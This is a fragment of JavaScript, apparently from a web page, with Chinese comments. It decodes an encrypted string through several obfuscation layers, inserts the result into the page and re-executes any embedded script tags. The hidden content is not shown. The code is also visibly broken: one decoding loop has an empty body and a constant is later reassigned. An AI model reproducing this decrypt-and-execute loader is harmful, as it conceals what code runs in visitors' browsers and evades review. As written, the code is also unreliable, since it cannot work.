            const factor = "r0mcl8vq56i";
            
            try {
                // 第5层：
                let step5 = atob(encrypted);
                
                // 第4层：
                let step4 = step5.split('').reverse().join('');
                
                // 第3层：
                let step3 = '';
                for (let i = 0; i < step4.length; i++) {
                    let charCode = step4.charCodeAt(i);
                    charCode = ((charCode >> 3) | (charCode << 5)) & 0xFF;
                    step3 += String.fromCharCode(charCode);
                }
                
                // 第2层：
                let step2 = '';
                for (let i = 0; i < step3.length; i++) {
                    const keyChar = factor.charCodeAt(i % factor.length);

                }
                
                // 第1层：
                let step1 = decodeURIComponent(escape(atob(step2)));
                
                // 显示内容
                document.getElementById('decrypted_content').innerHTML = step1;
                
                // 执行内容中的脚本
                const scripts = document.getElementById('decrypted_content').getElementsByTagName('script');
                for (let i = 0; i < scripts.length; i++) {
                    const newScript = document.createElement('script');
                    newScript.text = scripts[i].innerText;
                    document.head.appendChild(newScript);
                }

                setTimeout(() => {
                    encrypted = null;
                    factor = null;
